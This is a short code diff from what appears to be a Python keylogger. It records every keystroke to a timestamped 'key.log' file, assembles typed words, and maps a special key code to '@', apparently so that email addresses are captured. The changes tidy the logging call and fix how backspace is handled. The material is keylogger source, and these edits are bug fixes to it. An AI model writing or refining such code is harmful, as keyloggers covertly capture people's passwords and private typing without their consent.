@@ -5,10 +5,7 @@ word=''
 word_count=0
 word_count_limit=30
 
-#keys={Key.space:"",Key.enter:"",Key.backspace:
-#}
-
-logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')
+logging.basicConfig (filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')
 
 
 def on_press(key):
@@ -16,7 +13,7 @@ def on_press(key):
 	if key==Key.space or key ==Key.enter:
 		careter=" "
 	elif key==Key.backspace :
-		word=word[:-2]
+		word=word[:-1]
 		careter=""
 	elif key=="<65027>" :
 		careter="@"
